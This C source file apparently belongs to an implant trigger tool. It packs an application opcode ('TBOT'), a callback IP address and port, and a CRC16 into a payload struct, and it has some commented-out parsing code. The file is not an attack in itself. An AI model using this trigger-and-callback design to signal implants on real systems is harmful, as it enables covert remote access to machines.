#include <string.h>
#include "trigger_configuration.h"

// this is where string to OPCODE conversions are made
/* int  */
/* application_to_opcode( char * optarg,  */
/* 		       uint8_t * opcode )  */
/* { */

/*  /\*  if(optarg == NULL) { *\/ */

/* /\*     return FAILURE; *\/ */

/* /\*   } *\/ */

/* /\*   // do a string comparison for each  *\/ */
/* /\*   if( strcmp(optarg, "tbot") ||  strcmp(optarg, "TBOT") ) { *\/ */

/* /\*     *opcode =  _DIESEL_OPCODE_TBOT; *\/ */
/* /\*     return SUCCESS; *\/ */

/* /\*   } *\/ */

/*   return FAILURE; */

/* } */

// translate a trigger_into struct into the application specific
// payload that must be decoded
int 
trigger_info_to_payload( payload * p, 
			 trigger_info * ti) 
{

  uint16_t crc;

  if(p == NULL || ti == NULL) {

    return FAILURE;

  }


  switch(ti-> target_application ) {
    
  case _DIESEL_OPCODE_TBOT:
    
    p->opcode =  _DIESEL_OPCODE_TBOT;
    
    memcpy(&(p->package[0]), &(ti->callback_addr), sizeof(in_addr_t) );

    memcpy(&(p->package[4]), &(ti->callback_port), sizeof(uint16_t) );    
    
    p->crc = 0;
    
    break;

  default:

    return FAILURE;
    
  } 

  crc = tiny_crc16((const uint8_t *)p, sizeof(payload));
  
  crc = htons(crc);
  
  p->crc = crc;
  
  return SUCCESS;
}
